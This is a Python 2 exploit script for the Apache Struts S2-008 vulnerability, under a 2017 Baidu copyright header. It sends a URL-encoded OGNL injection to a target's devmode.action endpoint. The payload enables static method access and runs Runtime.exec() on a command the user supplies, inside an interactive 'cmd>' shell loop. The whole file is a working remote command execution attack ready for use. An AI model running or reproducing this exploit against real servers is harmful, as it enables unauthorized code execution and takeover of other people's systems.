##############################################################################
#
# Copyright (c) 2017 Baidu.com, Inc. All Rights Reserved
#
##############################################################################
"""
struts s2-008 exploit


Date: 2017/06/26 17:10:00
"""
#!/usr/bin/python
# -*- coding: utf-8 -*-

import re
import ssl
import sys
import httplib
import urllib
import urllib2
import fileinput

PATTERN = re.compile(r'<input type="text" name="age" value="([^"]*)" id="user_age"/>')


def _run(url, cmd):
    url += '/devmode.action'
    try:
        url += r'?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess'
        url += r'%22%5D%3Dtrue%2C%23foo%3D'
        url += r'new%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22x'
        url += r'work.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C'
        url += r'@org.apache.commons.io.IOUtils@toString%28'
        url += r'@java.lang.Runtime@getRuntime%28%29.exec%28%22'
        url += cmd
        url += r'%22%29.getInputStream%28%29,%22utf-8%22%29'
        url += r')'
        headers = {'User-Agent': 'Mozilla/5.0'}
        request = urllib2.Request(url, headers=headers)
        page = urllib2.urlopen(request).read()
        m = PATTERN.search(page)
        if m is not None:
            print(m.group(1))
            return m.group(1)
    except httplib.IncompleteRead as e:
        page = e.partial

    print(page)
    return page

if __name__ == "__main__":
    url = 'http://localhost:8080/S2-008' if len(sys.argv) == 1 else sys.argv[1]
    print 'URL=' + url

    while True:
        try:
            line = raw_input("cmd> ").strip()
            if line == 'exit':
                sys.exit()
            _run(url, line)
        except EOFError:
            print "\n"
            sys.exit()
        except Exception as e:
            print e
